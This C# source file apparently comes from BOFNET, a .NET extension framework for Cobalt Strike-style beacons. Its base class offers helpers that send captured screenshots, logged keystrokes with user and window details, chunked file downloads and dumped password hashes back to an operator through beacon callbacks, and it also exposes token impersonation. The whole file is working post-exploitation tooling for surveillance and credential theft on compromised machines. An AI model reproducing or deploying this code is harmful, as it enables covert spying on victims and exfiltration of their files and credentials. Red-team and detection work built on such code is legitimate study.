using System;
using System.IO;
using System.Net;
using System.Text;

namespace BOFNET {
    public abstract class BeaconObject {

        public struct UserHash {
            public string Username;
            public int Rid;
            public string Hash;

            public UserHash(string userName, int rid, string hash) {
                Username = userName;
                Rid = rid;
                Hash = hash;
            }
        }

        public Runtime.InitialiseChildBOFNETAppDomain InitialiseChildBOFNETAppDomain { get; }

        public TextWriter BeaconConsole { get; }

        public BeaconUseToken BeaconUseToken { get; }

        public BeaconRevertToken BeaconRevertToken { get; }

        public BeaconCallbackWriter BeaconCallbackWriter { get; }

        public BeaconObject(BeaconApi api) {
            BeaconConsole = api.Console;
            BeaconUseToken = api.BeaconUseToken;
            BeaconRevertToken = api.BeaconRevertToken;
            BeaconCallbackWriter = api.BeaconCallbackWriter;
            InitialiseChildBOFNETAppDomain = api.InitialiseChildBOFNETAppDomain;
        }
  
        public virtual void Go(string[] _) {}

        public virtual void Go(byte[] _) { }

        private void WriteSessionUserNameTitle(BinaryWriter bw, int session, string userName, string title) {
            bw.Write(session);
            bw.Write(title.Length);
            bw.Write(Encoding.UTF8.GetBytes(title));
            bw.Write(userName.Length);
            bw.Write(Encoding.UTF8.GetBytes(userName));
        }

        protected void SendScreenShot(byte[] jpgData, int session, string userName, string title) {

            var screenshotCallback = new BinaryWriter(new MemoryStream());
            screenshotCallback.Write(jpgData.Length);
            screenshotCallback.Write(jpgData);
            WriteSessionUserNameTitle(screenshotCallback, session, userName, title);

            BeaconCallbackWriter(OutputTypes.CALLBACK_SCREENSHOT, ((MemoryStream)screenshotCallback.BaseStream).ToArray(), (int)screenshotCallback.BaseStream.Length);
        }

        protected void SendKeystrokes(string keys, int session, string userName, string title) {

            var keystrokesCallback = new BinaryWriter(new MemoryStream());
            keystrokesCallback.Write(keys.Length);
            keystrokesCallback.Write(Encoding.UTF8.GetBytes(keys));
            WriteSessionUserNameTitle(keystrokesCallback, session, userName, title);

            BeaconCallbackWriter(OutputTypes.CALLBACK_KEYSTROKES, ((MemoryStream)keystrokesCallback.BaseStream).ToArray(), (int)keystrokesCallback.BaseStream.Length);
        }

        protected void DownloadFile(string fileName, Stream fileData) {

            var fileId = new Random().Next(1, int.MaxValue);
            BinaryWriter fileCallback;

            //Send the start of download callback
            fileCallback = new BinaryWriter(new MemoryStream());
            fileCallback.Write(fileId);
            fileCallback.Write(IPAddress.HostToNetworkOrder((int)fileData.Length));
            fileCallback.Write(Encoding.UTF8.GetBytes(fileName));
            BeaconCallbackWriter(OutputTypes.CALLBACK_FILE, ((MemoryStream)fileCallback.BaseStream).ToArray(), (int)fileCallback.BaseStream.Length);

            //Send callbacks in chunks of 900K, since a single CS
            //transfer is limited to around 1MB
            byte[] fileChunk = new byte[1024 * 900];
            int readSize;

            while( (readSize = fileData.Read(fileChunk, 0, fileChunk.Length)) > 0){
                fileCallback = new BinaryWriter(new MemoryStream());
                fileCallback.Write(fileId);
                fileCallback.Write(fileChunk,0,readSize);
                BeaconCallbackWriter(OutputTypes.CALLBACK_FILE_WRITE, ((MemoryStream)fileCallback.BaseStream).ToArray(), (int)fileCallback.BaseStream.Length);
            }

            //Send a close file callback to complete the transfer
            fileCallback = new BinaryWriter(new MemoryStream());
            fileCallback.Write(fileId);
            BeaconCallbackWriter(OutputTypes.CALLBACK_FILE_CLOSE, ((MemoryStream)fileCallback.BaseStream).ToArray(), (int)fileCallback.BaseStream.Length);
        }

        protected void SendHashes(UserHash[] userHashes) {

            var sw = new StringWriter();
            foreach (var userHash in userHashes) {
                sw.Write($"{userHash.Username}:{userHash.Rid}::{userHash.Hash}:::\n");
            }

            byte[] hashesData = Encoding.UTF8.GetBytes(sw.ToString());
            BeaconCallbackWriter(OutputTypes.CALLBACK_HASHDUMP, hashesData, hashesData.Length);
        }
    }
}
